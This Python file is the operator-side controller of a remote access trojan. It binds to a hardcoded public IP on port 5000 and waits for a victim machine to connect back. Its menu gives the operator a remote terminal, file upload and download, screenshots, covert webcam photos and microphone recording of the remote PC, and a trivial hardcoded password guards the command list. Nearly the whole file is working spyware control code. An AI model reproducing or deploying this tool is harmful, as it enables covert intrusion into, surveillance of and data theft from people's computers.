import socket
import os
import time

print("\n")
print("             ::::      ::          ::::         ::     ::      :::::::     ::::        :::")
print("             :: ::     ::         ::  ::        ::     ::     ::     ::    ::::       ::::")
print("             ::  ::    ::        ::    ::       :::::::::     ::     ::    :: ::     :: ::")
print("             ::   ::   ::       ::::::::::      ::     ::     ::     ::    ::  ::   ::  ::")
print("             ::    ::  ::      ::        ::     ::     ::     ::     ::    ::   :: ::   ::")
print("             ::     :: ::     ::          ::    ::     ::      :::::::     ::    :::    ::")

# cool color change
os.system('cmd /c "color 01"')
time.sleep(0.5)
os.system('cmd /c "color 0a"')
time.sleep(0.5)
os.system('cmd /c "color 04"')
time.sleep(0.5)
os.system('cmd /c "color 0E"')
time.sleep(0.5)
os.system('cmd /c "color 0b"')
time.sleep(0.5)


while True:
	os.system('cmd /c "color 09"')
	SERVER = input("\n\n[?] Enter Server Ip: ")
	SERVER = SERVER.lower()
	if SERVER == "public":
		SERVER = "196.189.25.123"
		break
	elif SERVER == "local":
		SERVER = socket.gethostbyname(socket.gethostname())
		break
	else:
		os.system('cmd /c "color 04"')
		print("[!] WRONG IP")
		os.system('cmd /c "color 0a"')

PORT = 5000
ADDR = (SERVER, PORT)
print("[+][LISTENING] Listening For Connection...")


Server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
Server.bind(ADDR)

Server.listen(2)
try:
	conn, addr = Server.accept()
except:
	quit()
	
print(f"[+][NEW CONNECTION] Connected With {addr}.")

# Current working directory
def cwd():
	print("******************** The Curret Working Directory Of Remote Computer *******************")
	Cwd = conn.recv(456).decode()
	print(f"\nThe Current Working Directory: {Cwd}")

# Veiw file on specfied directory
def cdir(path):
	try:
		print("********************  Files On The Remote Computer On The Specified Directory *******************")
		conn.send(path.encode())
		directory_files = conn.recv(45698).decode()
		print(directory_files)

	except:
		pass

#Change Directory
def cd(directory):
	print("******************** Changed The Working Directory To The Specified Directory *******************")

	change_directory = conn.send(directory.encode())
	changed_directory = conn.recv(7891).decode()

	if changed_directory == "[!] No Such Directory":
		print("[!] No Such Directory")
	else:
		print(directory)


# Send file to remote pc
def send_file(file_name):
	conn.send(file_name.encode())
	try:
		file_size = os.path.getsize(file_name)
		file_sizer = file_size
		file_size = str(file_size)
		conn.send(file_size.encode())

		with open(file_name, "rb") as f:
			while True:
				file = f.read(file_sizer)
				conn.sendall(file)
				break
	except:
		os.system('cmd /c "color 04"')
		print("[!] File Not Found")

def download_file(file_name):
	conn.send(file_name.encode())
	
	try:
		file_size = conn.recv(789).decode()
		File_size = int(file_size)

		with open(file_name, "wb") as f:
			file = conn.recv(File_size)
			while True:
				downloaded_file = f.write(file)
				break
	except:
		print("[!] File Not Found")



# Access remote terminal
def get_terminal():
	print("\n//////////////////////////////////////////////////////// ACCESS GRANTED ////////////////////////////////////////////////")
	active = True
	while active:
		os.system('cmd /c "color 04"')
		action = input("\n[+][REMOTE TERMINAL] >>>")
		conn.send(action.encode())
		if action == "exit":
			break
		try:
			terminal_output = conn.recv(99999).decode()
			print(terminal_output)
		except:
			terminal_output = conn.recv(9871).decode()
			print(terminal_output)
			break

def show_commands():
	password = input("Enter Password: ")
	password.lower()
	while password != "bunny":
		os.system('cmd /c "color 04"')
		print("[!][WRONG PASSWORD]")
		os.system('cmd /c "color 0a"')
		password = input("Enter Password: ")

	os.system('cmd /c "color 06"')
	print("\nUse <cd>  to change directory")
	print("Use <cdir> to view all the file on specified directory on remote pc.")
	print("Use <cwd>  to view the current Working directory of remote pc.")
	print("Use <sf> to send file to remote pc.")
	print("Use <df> to download file from remote pc")
	print("Use <terminal> to access remote pc terminal.")
	print("Use <ss> to screen shot remote pc screen.")
	print("Use <tpic> to take picture using remote pc's webcam and get the image.")
	print("Use <ra> to record using remote pc's microphone and get the audio.")





def screen_shout(image_name):
	conn.send(image_name.encode())
	file_size = conn.recv(987).decode()
	file_size = int(file_size)
	
	with open(image_name, "wb") as f:
		while True:
			file = conn.recv(file_size)
			new_file = f.write(file)
			break

def take_picture(picture_name):
	try:
		conn.send(picture_name.encode())
		size = conn.recv(987).decode()
		size = int(size)

		with open(picture_name, "wb") as f:
			file = conn.recv(size)
			while True:
				new_file = f.write(file)
				os.system(f'cmd /c "{picture_name}"')
				break
	except:
		pass


def record_audio():
	file_size = conn.recv(989).decode()
	file_size = int(file_size)

	file = conn.recv(file_size)
	file_name = "rec.wav"
	with open(file_name, "wb") as f:
		while True:
			new_file = f.write(file)
			break

	os.system('cmd /c "rec.wav"')



connected = True
while connected:
	os.system('cmd /c "color 0a"')
	command = input("\n[N^#0^^] Enter Command: ")
	conn.send(command.encode())

	if command == "<cwd>":
		cwd()

	elif command == "<cdir>":
		path = input("\n[?] Enter The Directory: ")
		cdir(fr"{path}")

	elif command == "<cd>":
		directory = input("\n[?] Enter Directory: ")
		cd(fr'{directory}')

	elif command == "<terminal>":
		get_terminal()

	elif command == "<sf>":
		print("                              [i] The File Must Be In The Server Directory")
		file_name = input("\nEnter File Name: ")
		send_file(file_name)

	elif command == "<df>":
		file_name = input("\n[?] Enter File Name: ")
		download_file(file_name)

	elif command == "<ss>":
		image_name = input("[?] Enter Name For The Image(.png): ")
		screen_shout(image_name)

	elif command == "<tpic>":
		picture_name = input("Enter the name for the picture(.jpg): ")
		take_picture(picture_name)

	elif command == "<ra>":
		record_audio()

	elif command == "<commands>":
		show_commands()

	else:
		os.system('cmd /c "color 04"')
		print("[!] Wrong Command")
		print("Type <commands> to see all commands")
		os.system('cmd /c "color 0a"')
